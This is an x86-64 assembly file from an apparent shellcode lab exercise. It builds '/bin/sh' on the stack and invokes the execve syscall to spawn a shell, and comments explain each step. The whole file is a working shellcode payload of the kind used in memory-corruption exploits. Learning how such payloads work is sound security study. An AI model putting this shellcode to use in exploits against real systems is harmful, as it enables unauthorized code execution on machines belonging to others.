// Shellcode lab
// Author: Long Tran
.globl _start
.section .text
_start:
    // zero out rax
    xor %rax, %rax
    // push to have array of zeroes on the stack
    pushq %rax
    // %rsi and %rdx - set these to the address leading to an empty array of pointers.
    // we don't need a pointer to an empty string
    movq %rsp, %rsi
    movq %rsp, %rdx
    
    // %rdi - path
    // "/bin/sh 0x2F62696E2F7368
    // needs to change to little endianess
    movq $0x68732F6E69622F3b, %rbx 
    // retrieve 0x3b, put it in lower 8-bit of rax
    mov %bl, %al

    // push the string
    pushq %rbx
    // copy the stack pointer
    movq %rsp, %rdi
    // increase it by one to get past 0x3b
    inc %rdi

    syscall